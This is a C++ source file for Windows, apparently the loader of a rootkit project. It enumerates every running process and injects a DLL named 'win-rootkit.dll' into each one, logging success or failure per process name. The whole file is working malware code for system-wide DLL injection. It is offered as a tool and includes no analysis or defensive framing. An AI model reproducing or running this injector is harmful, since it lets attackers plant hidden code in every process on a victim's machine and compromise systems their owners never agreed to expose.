#include <windows.h>
#include <tlhelp32.h>
#include <stdexcept>
#include <iostream>
#include <vector>
#include <map>

#include "dll_injector.h"


std::map<std::string, int> get_process_list()
{
	std::map<std::string, int> processes;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			processes[entry.szExeFile] = entry.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	return processes;
}

int get_pid_by_name(std::string name)
{
	auto processes = get_process_list();
	if (processes.find(name) == processes.end())
		return 0;
	return processes[name];
}

//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
	DllInjector injector("C:\\Users\\Win\\win-rootkit\\vs-project\\Release\\win-rootkit.dll");
	for (auto& pair : get_process_list())
	{
		try
		{
			injector.inject_into_pid(pair.second);
			std::cout << "SUCCESS; Process name: " << pair.first << std::endl;
		}
		catch (std::runtime_error& e)
		{
			std::cout << "FAIL; Process name: " << pair.first << std::endl;
			continue;
		}
	}
	system("pause");
	return 0;
}
